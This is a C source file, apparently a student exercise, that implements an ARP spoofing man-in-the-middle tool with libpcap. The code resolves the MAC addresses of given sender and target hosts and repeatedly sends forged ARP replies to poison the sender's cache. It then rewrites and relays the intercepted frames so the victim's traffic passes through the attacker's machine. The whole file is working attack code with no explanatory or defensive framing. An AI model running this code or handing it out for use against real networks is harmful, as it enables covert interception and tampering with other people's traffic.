#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include "arp_header.h"

void convert_ip(unsigned char *real, char *fake)
{
    sscanf(fake, "%d.%d.%d.%d", &real[0], &real[1], &real[2], &real[3]);
}
int main(int argc, char *argv[])
{
    unsigned char myMac[6];
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct ETH *eth = (struct ETH *) malloc(42);
    unsigned char *packet = (unsigned char *) malloc(42);
    int cnt = argc - 2;
    fp = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    const u_char *packet2;
    const u_char *packet3;

    if (fp == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
        return -1;
    }

    strcpy(s.ifr_name, argv[1]);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        memcpy(myMac, s.ifr_addr.sa_data, 6);
    } //get my mac

    uint8_t *target_mac = (uint8_t *) malloc(cnt * 6);
    uint8_t *sender_mac = (uint8_t *) malloc(cnt * 6);
    uint8_t *target_ip = (uint8_t *) malloc(cnt * 4);
    uint8_t *sender_ip = (uint8_t *) malloc(cnt * 4);
    uint8_t *inject = (uint8_t *) malloc(42 *cnt);

    for (int aaa = 0; aaa < cnt / 2; aaa++)
    {
        printf("%d\n", aaa);
        convert_ip(&target_ip[aaa * 4], argv[aaa*2+3]); //gg
        convert_ip(&sender_ip[aaa * 4], argv[aaa*2 + 2]); //gg



        memcpy(eth->D_Mac, "\xff\xff\xff\xff\xff\xff", 6);
        memcpy(eth->S_Mac, myMac, 6);
        memcpy(eth->EType, "\x08\x06", 2);
        memcpy(eth->hardwareType, "\x00\x01", 2);
        memcpy(eth->protocolType, "\x08\x00", 2);
        eth->hardwareSize = 0x06;
        eth->protocolSize = 0x04;
        memcpy(eth->opCode, "\x00\x01", 2); //request
        memcpy(eth->senderMac, myMac, 6);
        memcpy(eth->senderIp, "\x00\x00\x00\x00", 4);
        memcpy(eth->targetMac, "\x00\x00\x00\x00\x00\x00", 6);
        memcpy(eth->targetIp, &sender_ip[aaa * 4], 4); //gg

        memcpy(packet, eth, 42);
        if (pcap_sendpacket(fp, packet, 42))
            fprintf(stderr, "\t[!] failed to send packet: %s\n", pcap_geterr(fp));

        while (true)
        {
            struct pcap_pkthdr *header;
            int res = pcap_next_ex(fp, &header, &packet2);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            //printf("%u bytes captured\n", header->caplen);
            if (packet2[0xc] == 0x08 && packet2[0xd] == 0x06 && packet2[0x14] == 0x00 && packet2[0x15] == 0x02)
            {
                if (!memcmp(&packet2[0x1c], &sender_ip[aaa * 4], 4))
                { //gg
                    memcpy(&sender_mac[aaa * 6], (packet2 + 6), 6); //gg
                    break;
                }
            }
        }
        printf("sender MAC : ");
        for (int i = 0; i < 6; i++)
        {
            printf("0x%x ", sender_mac[i + aaa * 6]); //gg
        }
        puts("");

        /*know target mac*/
        memcpy(eth->D_Mac, "\xff\xff\xff\xff\xff\xff", 6);
        memcpy(eth->S_Mac, myMac, 6);
        memcpy(eth->EType, "\x08\x06", 2);
        memcpy(eth->hardwareType, "\x00\x01", 2);
        memcpy(eth->protocolType, "\x08\x00", 2);
        eth->hardwareSize = 0x06;
        eth->protocolSize = 0x04;
        memcpy(eth->opCode, "\x00\x01", 2); //request
        memcpy(eth->senderMac, myMac, 6);
        memcpy(eth->senderIp, "\x00\x00\x00\x00", 4);
        memcpy(eth->targetMac, "\x00\x00\x00\x00\x00\x00", 6);
        memcpy(eth->targetIp, &target_ip[aaa * 4], 4); //gg

        memcpy(packet, eth, 42);
        if (pcap_sendpacket(fp, packet, 42))
            fprintf(stderr, "\t[!] failed to send packet: %s\n", pcap_geterr(fp));
        /*know target mac*/

        while (true)
        {
            struct pcap_pkthdr *header;
            int res = pcap_next_ex(fp, &header, &packet2);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            //printf("%u bytes captured\n", header->caplen);
            if (packet2[0xc] == 0x08 && packet2[0xd] == 0x06 && packet2[0x14] == 0x00 && packet2[0x15] == 0x02)
            {
                if (!memcmp(&packet2[0x1c], &target_ip[aaa * 4], 4))
                { //gg
                    memcpy(&target_mac[aaa * 6], (packet2 + 6), 6); //gg
                    break;
                }
            }
        }

        printf("target MAC : ");
        for (int i = 0; i < 6; i++)
        {
            printf("0x%x ", target_mac[aaa * 6 + i]); //gg
        }
        puts("");

        memcpy(eth->D_Mac, &sender_mac[aaa * 6], 6); //gg
        memcpy(eth->S_Mac, myMac, 6);
        memcpy(eth->EType, "\x08\x06", 2);
        memcpy(eth->hardwareType, "\x00\x01", 2);
        memcpy(eth->protocolType, "\x08\x00", 2);
        eth->hardwareSize = 0x06;
        eth->protocolSize = 0x04;
        memcpy(eth->opCode, "\x00\x02", 2); //reply
        memcpy(eth->senderMac, myMac, 6);
        memcpy(eth->senderIp, &target_ip[aaa * 4], 4); //gg
        memcpy(eth->targetMac, &sender_mac[aaa * 6], 6); //gg
        memcpy(eth->targetIp, &sender_ip[aaa * 4], 4); //gg

        memcpy(&inject[42 *aaa], eth, 42); //gg
    }

    while (true)
    {
        struct pcap_pkthdr *header;

        int res = pcap_next_ex(fp, &header, &packet3);
        if (res == 0){continue; }
        if (res == -1 || res == -2) break;

        for (int bbb = 0; bbb < cnt / 2; bbb++)
        {
            if (pcap_sendpacket(fp, &inject[bbb*42], 42)) //gg
                fprintf(stderr, "\t[!] failed to send packet: %s\n", pcap_geterr(fp));
            //printf("%u bytes captured\n", header->caplen);


            if ((!memcmp(packet3, myMac, 6)) && (!memcmp(&packet3[6], &sender_mac[bbb*6], 6)))
            { //gg

                memcpy((void *) packet3, &target_mac[bbb*6], 6); //gg
                memcpy((void *) &packet3[6], myMac, 6); //gg

                for(int i = 0 ; i < 12;i++)
                    printf("0x%x ",packet3[i]);
                puts("");
                puts("");

                if (pcap_sendpacket(fp, packet3, header->caplen))
                {
                    fprintf(stderr, "\t[!] failed to send packet: %s\n", pcap_geterr(fp));

                }
            }
        }
    }

}
